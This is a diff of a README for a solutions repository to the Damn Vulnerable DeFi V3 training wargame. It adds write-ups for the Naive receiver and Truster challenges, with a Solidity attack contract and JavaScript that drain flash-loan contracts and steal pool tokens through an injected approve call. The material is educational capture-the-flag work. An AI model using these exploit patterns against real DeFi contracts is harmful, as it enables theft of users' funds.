@@ -19,6 +19,8 @@ Original repository (without solutions): [Damn Vulnerable DeFi V3 Github](https:
     - [Comprehensive Course Option](#comprehensive-course-option)
   - [1 - Unstoppable](#1---unstoppable)
   - [2 - Naive receiver](#2---naive-receiver)
+    - [Option 1: Solve with 10 Transactions](#option-1-solve-with-10-transactions)
+    - [Option 2: Solve with Only 1 Transaction](#option-2-solve-with-only-1-transaction)
   - [3 - Truster](#3---truster)
   - [4 - Side entrance](#4---side-entrance)
   - [5 - The rewarder](#5---the-rewarder)
@@ -112,13 +114,109 @@ The attack involves introducing a conflict between the two accounting systems th
 
 [Solution Test File](./test/unstoppable/unstoppable.challenge.ts)
 
-[Full Article](https://medium.com/@JohnnyTime)
+[Full Article](https://medium.com/p/1fe4364165cd)
 
-[![Watch The Walkthrough Video](https://i.imgur.com/kpgRtUq.jpg)](https://www.youtube.com/@JohnnyTime)
+[![Unstoppable Solution - Walkthrough Video](https://i.imgur.com/kpgRtUq.jpg)](https://www.youtube.com/watch?v=SssTj52WYNM)
 
 ## 2 - Naive receiver
+The challenge is simple: we gotta empty the FlashLoanReceiver contract of all its ETH. Let's see how it's done!
+
+We got two smart contracts:
+- `NaiveReceiverLenderPool.sol`: Provides flash loans at a 1 ETH fixed fee.
+- `FlashLoanReceiver.sol`: The contract that gets the flash loan and needs to repay it + the 1 ETH fee.
+
+So what's the vulnerability?
+
+FlashLoanReceiver disregards the first parameter in its `onFlashLoan` function, letting ANYONE initiate flash loans.
+This becomes an Access Control issue, allowing us to use it to execute multiple flash loans.
+
+### Option 1: Solve with 10 Transactions
+
+Initiate 10 flash loans on behalf of FlashLoanReceiver, each taking 1 ETH fee.
+Use the provided code in `naive-receiver.challenge.js`:
+
+```javascript
+const ETH = await pool.ETH();
+for(let i = 0; i < 10; i++){
+    await pool.connect(player).flashLoan(receiver.address, ETH, 0, "0x");
+}
+```
+
+### Option 2: Solve with Only 1 Transaction
+
+Deploy a malicious contract, `AttackNaiveReceiver.sol`, that requests 10 flash loans on behalf of FlashLoanReceiver.
+
+Here is the malicious smart contract code:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+interface IPool{
+     function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external returns (bool);
+}
+
+contract AttackNaiveReceiver {
+
+    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
+
+    constructor(address _pool, address _victim) {
+
+        for(uint256 i=0; i < 10; i++){
+            IPool(_pool).flashLoan(_victim, ETH, 0, "0x");
+        }
+    }
+
+}
+
+```
+
+And here's the code for `naive-receiver.challenge.js`:
+
+```javascript
+const AttackerContractFactory = await ethers.getContractFactory('AttackNaiveReceiver', player);
+await AttackerContractFactory.deploy(pool.address, receiver.address);
+```
+
+[Solution - AttackNaiveReceiver.sol Contract](./contracts/player-contracts/AttackNaiveReceiver.sol)
+
+[Solution - Test File](./test/naive-receiver/naive-receiver.challenge.ts)
+
+[Full Article](https://medium.com/p/73a06de164ef)
+
+[![Naive Receiver Solution - Walkthrough Video](https://i.imgur.com/FhJsAVK.jpg)](https://www.youtube.com/watch?v=2tFlcH5k-jk)
+
 
 ## 3 - Truster
+The goal in this challenge is to steal 1 million DVT tokens from a lending pool. 
+
+The challenge centers around a vulnerable smart contract called TrusterLenderPool. 
+This contract allows flash loans, where users can temporarily borrow tokens and interact with another contract.
+
+The vulnerability lies in the `flashLoan` function, which lets anyone trigger various contract calls through the pool contract. However, this could be risky as the caller's context (msg.sender) is the pool contract. The aim is to exploit this vulnerability to gain access to the tokens.
+
+The technique involves leaving a "backdoor" exploiting a feature in the ERC20 fungible token standard.
+
+By using the `approve` function, the pool contract grants permission to another address to spend its tokens. This approval allows the address to use the `transferFrom` function to acquire tokens. The plan is to have the pool contract approve the exploiter's address, then later use the transferFrom function to take the tokens.
+
+The challenge can be solved by adding the following code to the `truster.challenge.js` file (Execution section):
+
+```javascript
+let interface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"])
+let data = interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
+
+await pool.connect(player).flashLoan(0, player.address, token.address, data);
+await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL)
+```
+
+The provided code prepares information for the "approve" function call. It includes the exploiter's address and the number of tokens in the pool. A flash loan is triggered with a request for 0 tokens, focusing on executing the approval function. Once approved, the transferFrom function is used to grab all approved tokens.
+
+The challenge is completed and the tokens are acquired! :)
+
+[Solution - Test File](./test/truster/truster.challenge.ts)
+
+[Full Article](https://medium.com/p/cac8adf55233)
+
+[![Truster Solution - Walkthrough Video](https://i.imgur.com/afEnVwL.jpg)](https://www.youtube.com/watch?v=CMRaTqjLUfc)
 
 ## 4 - Side entrance
 
